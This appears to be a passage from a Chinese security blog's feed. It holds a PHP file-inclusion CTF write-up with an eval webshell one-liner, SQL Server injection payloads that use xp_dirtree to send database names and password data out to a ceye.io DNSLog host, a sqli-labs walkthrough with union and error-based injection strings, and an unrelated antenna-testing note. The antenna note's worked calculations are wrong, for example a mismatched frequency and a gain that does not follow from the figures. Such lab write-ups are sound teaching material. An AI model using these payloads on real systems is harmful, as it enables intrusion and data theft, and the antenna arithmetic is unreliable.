title="大小写绕过"></a>大小写绕过</h3><p>Payload：<code>?page=PhP://input+POST任意PHP命令</code></p><p>由于strstr()这个函数是区分大小写的所以我们可以转换成大小写用<code>PHP://input</code>，用POST传输恶意代码：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>。</p><h3 id="data协议任意命令执行（明文和base64都可）"><a href="#data协议任意命令执行（明文和base64都可）" class="headerlink" title="data协议任意命令执行（明文和base64都可）"></a>data协议任意命令执行（明文和base64都可）</h3><p>Payload：<code>?page=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmw0Z2lzaXNpc2gzcjMucGhwIik7Pz4=</code></p><h3 id="data-伪协议传木马"><a href="#data-伪协议传木马" class="headerlink" title="data://伪协议传木马"></a>data://伪协议传木马</h3><p><code>&lt;?php eval($_POST[xiaohua]); ?&gt;</code> base64加密后拼接</p><h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>因为<code>show_source(__FILE__);</code>这行代码输出的代码都是经过HTML实体编码的无法被include识别，而我们可以任意掌控hello这个参数的值，所以如果使用HTTP协议让page参数为一个带有hello参数输出的index.php，那么也可以利用hello参数进行任意命令执行（前提是php.ini中的allow_url_include设置为了On）：</p><p>Payload：<code>?page=http://localhost/index.php?hello=&lt;?show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;</code></p><h2 id="伪协议相关"><a href="#伪协议相关" class="headerlink" title="伪协议相关"></a>伪协议相关</h2><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">文件包含漏洞与PHP伪协议</a></p><p><a href="https://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="noopener">php 伪协议</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入DNSLog学习笔记</title>
      <link href="/2020/05/06/SQL-DNS-INJEC-Notes/"/>
      <url>/2020/05/06/SQL-DNS-INJEC-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="DNSlog解释"><a href="#DNSlog解释" class="headerlink" title="DNSlog解释"></a>DNSlog解释</h2><p>在SQL盲注过程中，手工注入非常耗时，除了使用sqlmap，还可以利用DNSLog获取数据。简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过这种方式把想获得的数据外带出来。具体原理可以参考这篇文献<a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="noopener">Data Retrieval over DNS in SQL Injection Attacks</a>。</p><a id="more"></a><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>SQL注入中的盲注</li><li>无回显的命令执行</li><li>无回显的SSRF</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>由于Linux下不支持UNC路径，所以本文主要以 Windows Server 2008 R2 + SQL Server 2008 + ASPX 搭建实验环境。DNSLog平台使用创宇404实验室的dnslog平台。</p><p>SQL注入漏洞页面如下，数据通过POST方式传播。</p><p><img src="./fig1.png" alt="fig1"></p><h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><p>首先构造payload查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),db_name())+<span class="string">'.xxxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig2.png" alt="fig2"></p><h3 id="查询用户名"><a href="#查询用户名" class="headerlink" title="查询用户名"></a>查询用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),user_name())+<span class="string">'.xxxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig3.png" alt="fig3"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.columns))+<span class="string">'.xxxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig4.png" alt="fig4"></p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>获取列第一个名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),(<span class="keyword">select</span> top <span class="number">1</span> COLUMN_NAME <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME=<span class="keyword">cast</span>(<span class="number">0x7573657273</span> <span class="keyword">as</span> <span class="built_in">varchar</span>)))+<span class="string">'.xxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig4-1.png" alt="fig4-1"></p><p>获取列第二个名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),(<span class="keyword">select</span> top <span class="number">1</span> * <span class="keyword">from</span> (<span class="keyword">select</span> top <span class="number">2</span> COLUMN_NAME <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME=<span class="keyword">cast</span>(<span class="number">0x7573657273</span> <span class="keyword">as</span> <span class="built_in">varchar</span>) <span class="keyword">order</span> <span class="keyword">by</span> COLUMN_NAME <span class="keyword">desc</span>) s <span class="keyword">order</span> <span class="keyword">by</span> COLUMN_NAME <span class="keyword">asc</span>))+<span class="string">'.xxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig5.png" alt="fig5"></p><p>获取列第三个名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),(<span class="keyword">select</span> top <span class="number">1</span> * <span class="keyword">from</span> (<span class="keyword">select</span> top <span class="number">3</span> COLUMN_NAME <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME=<span class="keyword">cast</span>(<span class="number">0x7573657273</span> <span class="keyword">as</span> <span class="built_in">varchar</span>) <span class="keyword">order</span> <span class="keyword">by</span> COLUMN_NAME <span class="keyword">desc</span>) s <span class="keyword">order</span> <span class="keyword">by</span> COLUMN_NAME <span class="keyword">asc</span>))+<span class="string">'.xxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig6.png" alt="fig6"></p><p>当获取第四个列名时与第三个相同，所以推测这个表只有三字段。</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),(<span class="keyword">select</span> top <span class="number">1</span> credit <span class="keyword">from</span> <span class="keyword">users</span>))+<span class="string">'.xxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig7.png" alt="fig7"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'; <span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),<span class="keyword">CAST</span>((<span class="keyword">select</span> top <span class="number">1</span> pwd <span class="keyword">from</span> <span class="keyword">users</span>) <span class="keyword">as</span> <span class="built_in">int</span>))+<span class="string">'.xxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"'); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="./fig8.png" alt="fig8"></p><p>这里查询密码<code>pwd</code>字段，由于字段类型为<code>nchar</code>，不能直接用<code>convert</code>函数转换，所以先用<code>cast</code>函数转换为其他类型，但是由于密码中也会含有字母，涉及到ASCII码转换，在SQL中会非常麻烦。</p><p>实际过程中，可以先利用DNSLog爆出数据库信息，再配合其他渗透方法渗透，也许会简单一些。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/" target="_blank" rel="noopener">dnslog</a></p><p><a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></p><p><a href="https://zhuanlan.zhihu.com/p/23631785" target="_blank" rel="noopener">(记录)一次sql延时注入之dnslog的利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天线实测方法笔记</title>
      <link href="/2020/05/04/Antenna-Measurement-Note/"/>
      <url>/2020/05/04/Antenna-Measurement-Note/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>通常条件下，微波暗室很难配备，如何在没有微波暗室情况下测量天线的特性参数非常重要。</p><a id="more"></a><h2 id="电路特性参数测试"><a href="#电路特性参数测试" class="headerlink" title="电路特性参数测试"></a>电路特性参数测试</h2><p>电路特性参数主要包括：电压驻波比(VSWR)、回波损耗($S_{11}$)、隔离度、三阶交调等。</p><p><img src="./fig1.png" alt="Fig1"></p><p>通常测试时，工业上要求：</p><ul><li>VSWR &lt; 2</li><li>$S_{11}$ &lt; -10 dB</li><li>隔离度 &lt; -20 dB</li></ul><p>注：隔离度针对多端口，例如MIMO天线，两个馈点。将两个馈点同时接到网络分析仪，测量的$S_{12}$和$S_{21}$即为隔离度。</p><h3 id="ADS与网络分析仪联调"><a href="#ADS与网络分析仪联调" class="headerlink" title="ADS与网络分析仪联调"></a>ADS与网络分析仪联调</h3><p>通常，使用网络分析仪测量回波损耗($S_{11}$)，导出为<code>.snp</code>文件，并导入ADS进行匹配电路设计。</p><h2 id="辐射特性参数测试"><a href="#辐射特性参数测试" class="headerlink" title="辐射特性参数测试"></a>辐射特性参数测试</h2><p><img src="./fig2.png" alt="Fig2"></p><p>如图，$\lambda/2$波长内为近场，$10\lambda$波长外为远场，要测试天线的辐射特性参数，例如增益、方向图，必须放到远场测试。</p><p><img src="./fig3.png" alt="Fig3"></p><p>上图显示了微波暗室的结构，微波暗室自动化程度非常高。微波暗室可测试的参数包括：</p><ul><li>增益</li><li>半功率波束宽度 (3dB波束)</li><li>前后比</li><li>交叉极化比</li><li>方向图</li></ul><h2 id="无微波暗室时的测试评估"><a href="#无微波暗室时的测试评估" class="headerlink" title="无微波暗室时的测试评估"></a>无微波暗室时的测试评估</h2><h3 id="增益测试一"><a href="#增益测试一" class="headerlink" title="增益测试一"></a>增益测试一</h3><p><img src="./fig4.png" alt="Fig4"></p><p>如图所示，两个被测天线，其中一个个可接信号发生器（或者射频模块）。例如，被测天线为 443 MHz 天线，发射端可接一个LoRa或者Si4463模块，把发射功率配置为 15 dBm，默认天线效率为 100% ，在接收端频谱分析仪上课测得接收功率，假设此时接收功率测得 -70 dBm，则发射到接收过程总损失为 LOS = 85 dBm。公式中，发射增益与接收增益相等，$G_T=G_R$。通过公式可以粗略算出天线增益。假设测试传输距离$D=1~\mathrm{km}$。</p><p>$$LOS-LOS_{air}=32.44+20\log_{10}{D_{km}}+20\log_{10}{f_{MHz}}-G_T-G_R$$</p><p>$$85-35=32.44+20\lg{1}+20\lg{433}-2G_T$$</p><p>$$G_T\approx G_R\approx 35.14~\mathrm{dB}$$</p><p>测试时需要校准$LOS_{air}$的值，用标准天线（增益已知），假设天线增益为 2 dBi，此时发射功率为15 dBm，接收功率为 -60 dBm，则公式为：</p><p>$$75-LOS_{air}=32.44+20\lg{1}+20\lg{433}-2*2$$</p><p>可得到$LOS_{air}$的值，在相同的环境下，$LOS_{air}$的值不会改变，以这个值作为参考，可以获得较为理想的天线增益。</p><p>总体来说，这个公式对天线增益的处理有限，只能作为一个评估值，根据天线性能需求，对设计天线有指导意义。</p><h3 id="增益测试二"><a href="#增益测试二" class="headerlink" title="增益测试二"></a>增益测试二</h3><p><img src="./fig5.png" alt="Fig5"></p><p>方法二是弗里斯传输共识（Friis transmission equation）的应用，测试结构拓扑与方法一相同。注意：功率所使用的单位为 W(瓦特)，增益单位不是 dBi。这个方法实测较为准确。实例如下：</p><p><img src="./fig6.png" alt="Fig6"></p><p>注：同轴线损耗也需要考虑，测试前须测量同轴线损耗。</p><p>对于多频天线，例如WIFI天线，信号发生器设置不同的频率，进行多次测量，就可以测得不同频率下天线的增益。</p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><ul><li>方法一主要作为开发前的评估使用，方法二测试比较准确，更接近天线实际增益，作为设计天线后的测试指标。</li><li>方法一与方法二差距并不大，约 2 dB左右。</li><li>方法一使用频率进行计算，方法二使用波长进行计算，两者差距并不大。</li></ul><h3 id="接收灵敏度测试"><a href="#接收灵敏度测试" class="headerlink" title="接收灵敏度测试"></a>接收灵敏度测试</h3><h2 id="模块接收灵敏度测试"><a href="#模块接收灵敏度测试" class="headerlink" title="模块接收灵敏度测试"></a>模块接收灵敏度测试</h2><p><img src="./fig7.png" alt="Fig7"></p><p>上图为测试拓扑链路，其中信号发生器直接接到模块接收天线处。假设信号发生器，当输出功率为 -119 dBm 时模块还可以接收到信号，-120 dBm 时就接收不到信号，则可以说模块的接收灵敏度为 -120 dBm。同样，信号发生器也可以使用发射模块代替。</p><h3 id="天线接收灵敏度测试"><a href="#天线接收灵敏度测试" class="headerlink" title="天线接收灵敏度测试"></a>天线接收灵敏度测试</h3><p><img src="./fig8.png" alt="Fig8"></p><p>上图为天线接收灵敏度测试方法。若测量天线时，接收模块已经达到接收灵敏度极限值，则可以说天线接收灵敏度大于接收模块接收灵敏度,若要进一步测试，则需要换更精密设备，如示波器或者频谱分析仪。通过频谱分析仪，可以看到信号的波动。</p><p>例如：信号发生器发射功率为 -110 dBm，信道衰减为 30 dBm，此时接收天线完全接收不到信号，接收天线此时的接收功率为 -140 dBm。</p><h2 id="天线方向图测试"><a href="#天线方向图测试" class="headerlink" title="天线方向图测试"></a>天线方向图测试</h2><h3 id="场强计测试法"><a href="#场强计测试法" class="headerlink" title="场强计测试法"></a>场强计测试法</h3><p><img src="./fig9.png" alt="Fig9"></p><h3 id="增益测试法"><a href="#增益测试法" class="headerlink" title="增益测试法"></a>增益测试法</h3><p><img src="./fig10.png" alt="Fig10"></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>假设有一个Zigbee模块，设计一个蓝牙天线，发射功率为 5 dBm，中心频率为 2.45 GHz，要求可以传输 80 m，分析天线增益要求。假定接收模块为cc2540，接收灵敏度为 -100 dBm，假设空气损耗为 35 dB：</p><p>$$105~\mathrm{dBm}-35=32.4+20\lg{2450}+20\lg{0.08}-2G_T$$</p><p>$$G_T \approx -0.85~\mathrm{dBi}$$</p><p>考虑天线极化方式，如果是线极化，则天线增益损耗一半，则实际增益值应为：</p><p>$$G_T\approx -0.85+3\approx 2.15~\mathrm{dBi}$$</p><p>极化损失一般是针对圆极化与线极化来说，天线极化方式相同，则损耗较小。</p><p>假设标准天线增益为 2 dBi，发射功率为 5 dBm，芯片接收灵敏度为 -100 dBm，距离 80m，</p><p>$$105~\mathrm{dBm}-LOS_{air}=32.4+20\lg{2450}+20\lg{0.08}-2*2$$</p><p>$$LOS_{air}\approx 30.76~\mathrm{dB}$$</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1V54y1X78Z" target="_blank" rel="noopener">天线的测试方法讲解</a></p>]]></content>
      
      
      <categories>
          
          <category> Antenna </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Antenna </tag>
            
            <tag> 天线测试 </tag>
            
            <tag> RF/Microwave </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs 通关笔记 (持续更新)</title>
      <link href="/2020/05/04/sqli-labs-notes/"/>
      <url>/2020/05/04/sqli-labs-notes/</url>
      
        <content type="html"><![CDATA[<h2 id="Enviroment"><a href="#Enviroment" class="headerlink" title="Enviroment"></a>Enviroment</h2><p>为了方便搭建，本文使用vulstudy搭建sqli-labs环境。搭建方法参考链接：<a href="https://github.com/c0ny1/vulstudy" target="_blank" rel="noopener">Vulstudy</a>。在实际练习中，也参考了网络上的解析文章，参考链接附在文末。关于Sqli-labs，作者Audi本人做了非常详细的教学视频，可以参考学习，视频连接：<a href="http://www.securitytube.net/user/Audi" target="_blank" rel="noopener">Audi’s Sqli-Labs Series</a>。</p><a id="more"></a><h2 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>使用单引号报错，可以判断是字符型注入:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-1</span>/?id=<span class="number">1'</span> <span class="comment">//报错</span></span><br><span class="line">localhost/Less-1/?id=1' and '1'='1 //正常</span><br></pre></td></tr></table></figure><p>判断字段数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-1</span>/?id=<span class="number">1'</span> order by <span class="number">4</span> --+ <span class="comment">//4报错，说明只有三个字段</span></span><br></pre></td></tr></table></figure><p>使<code>id=-1</code>报错并联合查询，判断显位：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-1</span>/?id=<span class="number">-1'</span> <span class="keyword">union</span> all select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> --+</span><br></pre></td></tr></table></figure><p><img src="./less-1-fig-1.png" alt="less-1-fig-1"></p><p>查询系统信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-1</span>/?id=<span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,database(),version() --+</span><br><span class="line"><span class="comment">// 数据库名:security 版本: 5.5.47-0ubuntu0.14.04.1</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-1</span>/?id=<span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata --+</span><br><span class="line"><span class="comment">// 爆出所有数据库: information_schema,challenges,mysql,performance_schema,security</span></span><br><span class="line"></span><br><span class="line">localhost/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security' --+</span><br><span class="line"><span class="comment">// 爆出security所有表名: emails,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line">localhost/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users' --+</span><br><span class="line"><span class="comment">// 爆出security.users所有字段名: id,username,password</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-1</span>/?id=<span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,group_concat(username),group_concat(password) from users --+</span><br><span class="line"><span class="comment">// 爆出username: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span></span><br><span class="line"><span class="comment">// 爆出password: Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span></span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>这道题是数字型查询：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-2</span>/?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">//正常</span></span><br><span class="line">localhost/Less<span class="number">-2</span>/?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="comment">//报错</span></span><br></pre></td></tr></table></figure><p>查询语句与上题相似，id不需要单引号，末尾不需要注释符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-2</span>/?id=<span class="number">1</span> order by <span class="number">4</span></span><br><span class="line"><span class="comment">//4报错，说明只有三个字段</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-2</span>/?id=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,database(),version()</span><br><span class="line"><span class="comment">// 数据库名:security 版本: 5.5.47-0ubuntu0.14.04.1</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-2</span>/?id=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata</span><br><span class="line"><span class="comment">// 爆出所有数据库: information_schema,challenges,mysql,performance_schema,security</span></span><br><span class="line"></span><br><span class="line">localhost/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security'</span><br><span class="line"><span class="comment">// 爆出security所有表名: emails,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line">localhost/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users'</span><br><span class="line"><span class="comment">// 爆出security.users所有字段名: id,username,password</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-2</span>/?id=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,group_concat(username),group_concat(password) from users</span><br><span class="line"><span class="comment">// 爆出username: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span></span><br><span class="line"><span class="comment">// 爆出password: Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span></span><br></pre></td></tr></table></figure><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>添加单引号后报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>可以推断查询语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">'$id'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>则需要闭合括号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-3</span>/?id=<span class="number">-1'</span>) <span class="keyword">union</span> select <span class="number">1</span>,database(),version() --+</span><br><span class="line"><span class="comment">// 数据库名:security 版本: 5.5.47-0ubuntu0.14.04.1</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-3</span>/?id=<span class="number">-1'</span>) <span class="keyword">union</span> select <span class="number">1</span>,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>添加双引号报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>可以推断查询语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">"$id"</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>使用双引号加括号闭合：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-4</span>/?id=<span class="number">-1</span><span class="string">") union select 1,group_concat(username),group_concat(password) from users --+</span></span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>加单引号，报错，但是没有显位，使用双查询（Double Injection）报错注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-5</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select @@version),<span class="number">0x7e</span>)) --+</span><br><span class="line"><span class="comment">//XPATH syntax error: '~5.5.47-0ubuntu0.14.04.1~'</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-5</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>)) --+</span><br><span class="line"><span class="comment">//XPATH syntax error: '~security~'</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-5</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema=<span class="string">"security"</span>),<span class="number">0x7e</span>)) --+</span><br><span class="line"><span class="comment">//XPATH syntax error: '~emails,referers,uagents,users~'</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-5</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) from information_schema.columns where table_schema=<span class="string">"security"</span> <span class="keyword">and</span> table_name=<span class="string">"users"</span>),<span class="number">0x7e</span>)) --+</span><br><span 